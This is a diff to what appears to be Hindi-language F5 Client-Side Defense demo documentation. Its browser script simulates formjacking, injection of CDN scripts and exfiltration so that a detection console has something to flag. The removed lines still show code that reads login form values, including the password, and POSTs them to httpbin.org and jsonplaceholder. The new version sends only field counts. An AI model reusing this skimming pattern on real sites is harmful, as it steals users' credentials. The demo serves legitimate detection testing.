@@ -22,12 +22,11 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
     // Phase 1: Harvest all form fields (CSD tracks field reads on page-load DOM fields)
     console.log('\\n[Formjack] Phase 1: Form field harvesting');
     var inputs = document.querySelectorAll('input');
-    var harvested = {};
+    var populatedFieldCount = 0;
     inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
     });
-    console.log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+    console.log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
     // Phase 2: Inject third-party scripts from 4 CDN domains
     console.log('\\n[Supply Chain] Phase 2: Multi-CDN script injection');
@@ -50,12 +49,13 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
         console.log('[Supply Chain] Injected script tag: ' + cdn.name);
     });
 
-    // Phase 3: Exfiltrate harvested data to external endpoints
+    // Phase 3: Send synthetic counters to external endpoints
     console.log('\\n[Exfil] Phase 3: Data exfiltration');
     var payload = JSON.stringify({
         type: 'combined_demo',
-        credentials: harvested,
-        page: window.location.href,
+        field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true,
         timestamp: Date.now()
     });
 
@@ -64,7 +64,7 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
         mode: 'no-cors',
         body: payload
     }).then(function() {
-        console.log('[Exfil] Data sent to www.httpbin.org');
+        console.log('[Exfil] Synthetic signal sent to www.httpbin.org');
     });
 
     fetch('https://jsonplaceholder.typicode.com/posts', {
@@ -73,13 +73,13 @@ export const combinedScript = `// CSD Demo — Combined Detection Script
         headers: { 'Content-Type': 'application/json' },
         body: payload
     }).then(function() {
-        console.log('[Exfil] Data sent to jsonplaceholder.typicode.com');
+        console.log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com');
     });
 
     // Summary
     console.log('\\n' + '='.repeat(50));
     console.log('[CSD Demo] Simulation complete');
-    console.log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+    console.log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
     console.log('[CSD Demo] Scripts injected: ' + cdns.length + ' (4 CDN domains)');
     console.log('[CSD Demo] Exfil channels: 2 (fetch POST)');
     console.log('[CSD Demo] Detection takes 5-10 minutes to appear in the CSD console.');
@@ -95,7 +95,7 @@ CSD ब्राउज़र के अंदर JavaScript व्यवहा�
 <Steps>
 1. Juice Shop के **लॉगिन पेज** पर `https://botdemo.sales-demo.f5demos.com/#/login` पर जाएँ
 
-2. फॉर्म फील्ड में डमी क्रेडेंशियल दर्ज करें — **Email** फील्ड में `test@example.com` और **Password** फील्ड में `P@ssword123` टाइप करें (फॉर्म सबमिट न करें)
+2. फॉर्म फील्ड में डमी क्रेडेंशियल दर्ज करें — **Email** फील्ड में `test@example.com` और **Password** फील्ड में `<DEMO_PASSWORD>` टाइप करें (फॉर्म सबमिट न करें)
 
 3. DevTools खोलें (**F12** &rarr; **Console** टैब)
 
@@ -139,7 +139,7 @@ var _poll = _si(function() {
       window.HTMLInputElement.prototype, 'value').set;
     nativeSet.call(emailEl, 'test@example.com');
     emailEl.dispatchEvent(new Event('input', { bubbles: true }));
-    nativeSet.call(passEl, 'P@ssword123');
+    nativeSet.call(passEl, '<DEMO_PASSWORD>');
     passEl.dispatchEvent(new Event('input', { bubbles: true }));
 
     // Run Combined Detection Script inline using native fetch for exfil
@@ -150,12 +150,11 @@ var _poll = _si(function() {
 
       _log('\n[Formjack] Phase 1: Form field harvesting');
       var inputs = document.querySelectorAll('input');
-      var harvested = {};
+      var populatedFieldCount = 0;
       inputs.forEach(function(input) {
-        var name = input.name || input.id || input.type;
-        harvested[name] = input.value || '(empty)';
+        if (input.value) populatedFieldCount++;
       });
-      _log('[Formjack] Harvested ' + Object.keys(harvested).length + ' fields:', harvested);
+      _log('[Formjack] Observed ' + inputs.length + ' fields; values discarded');
 
       _log('\n[Supply Chain] Phase 2: Multi-CDN script injection');
       var cdns = [
@@ -175,19 +174,20 @@ var _poll = _si(function() {
 
       _log('\n[Exfil] Phase 3: Data exfiltration');
       var payload = JSON.stringify({
-        type: 'combined_demo', credentials: harvested,
-        page: window.location.href, timestamp: Date.now()
+        type: 'combined_demo', field_count: inputs.length,
+        populated_field_count: populatedFieldCount,
+        field_values_discarded: true, timestamp: Date.now()
       });
       _fetch('https://www.httpbin.org/post', { method: 'POST', mode: 'no-cors', body: payload })
-        .then(function() { _log('[Exfil] Data sent to www.httpbin.org'); });
+        .then(function() { _log('[Exfil] Synthetic signal sent to www.httpbin.org'); });
       _fetch('https://jsonplaceholder.typicode.com/posts', {
         method: 'POST', mode: 'no-cors',
         headers: { 'Content-Type': 'application/json' }, body: payload
-      }).then(function() { _log('[Exfil] Data sent to jsonplaceholder.typicode.com'); });
+      }).then(function() { _log('[Exfil] Synthetic signal sent to jsonplaceholder.typicode.com'); });
 
       _log('\n==================================================');
       _log('[CSD Demo] Simulation complete');
-      _log('[CSD Demo] Fields harvested: ' + Object.keys(harvested).length);
+      _log('[CSD Demo] Fields observed: ' + inputs.length + ' (values discarded)');
       _log('[CSD Demo] Scripts injected: 4 (4 CDN domains)');
       _log('[CSD Demo] Exfil channels: 2 (fetch POST)');
       _log('==================================================');
@@ -220,7 +220,7 @@ var _poll = _si(function() {
 | --- | --- | --- |
 | **फील्ड हार्वेस्टिंग** | मौजूदा `input` एलिमेंट (email, password) से वैल्यू पढ़ता है | स्क्रिप्ट संवेदनशील फॉर्म फील्ड पढ़ रही हैं — High Risk के रूप में फ्लैग किया गया |
 | **स्क्रिप्ट इंजेक्शन** | `cdn.jsdelivr.net`, `esm.sh`, `unpkg.com`, और `ga.jspm.io` से लोड करने वाले 4 `<script>` टैग जोड़ता है | पेज पर 4 नए थर्ड-पार्टी स्क्रिप्ट डोमेन |
-| **डेटा एक्सफिल्ट्रेशन** | `fetch` के माध्यम से `www.httpbin.org` और `jsonplaceholder.typicode.com` पर हार्वेस्ट किया गया डेटा भेजता है | बाहरी डोमेन पर नेटवर्क कॉल (नोट: fetch गंतव्य स्क्रिप्ट नेटवर्क इंटरैक्शन के रूप में दिखाई देते हैं, Network डोमेन व्यू में नहीं) |
+| **सिंथेटिक नेटवर्क सिग्नल** | `fetch` से फ़ील्ड की संख्या और discard marker भेजता है; फ़ील्ड मान payload में कभी नहीं जाते | बाहरी डोमेन पर नेटवर्क कॉल (नोट: fetch गंतव्य स्क्रिप्ट नेटवर्क इंटरैक्शन के रूप में दिखाई देते हैं, Network डोमेन व्यू में नहीं) |
 
 <Aside type="note">
 CSD की विशिष्ट डिटेक्शन सीमाएँ हैं — उदाहरण के लिए, केवल पेज-लोड DOM फील्ड ट्रैक किए जाते हैं और Network व्यू केवल स्क्रिप्ट-लोड डोमेन दिखाता है। पूरी सूची के लिए [डिटेक्शन सीमाएँ](/csd/hi/overview/#detection-boundaries) देखें।
